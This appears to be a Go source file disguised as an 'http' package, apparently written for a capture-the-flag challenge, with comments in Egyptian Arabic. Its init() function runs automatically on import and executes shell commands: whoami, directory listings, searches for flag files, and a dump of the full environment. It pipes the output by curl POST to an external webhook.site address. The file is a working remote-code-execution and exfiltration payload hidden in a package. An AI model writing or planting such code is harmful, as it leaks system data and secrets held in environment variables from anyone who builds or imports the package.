package http

import "os/exec"

func init() {
    // نفذ أي أوامر عايزها وابعتهم كلهم مرة واحدة للـ webhook
    exec.Command("bash", "-c", `
        # كل الأوامر اللي ممكن تحتاجها
        whoami
        id
        pwd
        ls -la /
        cat /flag* 2>/dev/null || echo "no direct flag"
        find / -name "*flag*" -type f 2>/dev/null | head -5
        cat /home/*/flag* 2>/dev/null 2>&1 || true
        env | grep -i flag
    `).Run()

    // الجزء المهم: نفذ الأوامر وابعتهم كلهم للـ webhook
    exec.Command("bash", "-c", `
        (
            echo "=== RCE EXECUTED SUCCESSFULLY ==="
            echo "User: $(whoami)"
            echo "PWD: $(pwd)"
            echo ""
            echo "=== ls / ==="
            ls -la /
            echo ""
            echo "=== Trying to read flags ==="
            cat /flag* 2>/dev/null || cat /*flag* 2>/dev/null || echo "Flag not found in common places"
            echo ""
            echo "=== Searching system for flag files ==="
            find / -name "*flag*" -type f 2>/dev/null | head -10 || echo "find failed"
            echo ""
            echo "=== Environment ==="
            env
        ) | curl -X POST https://webhook.site/eb4f653b-4fb0-4754-bbde-7086d88f9b8a --data-binary @-
    `).Start()
}
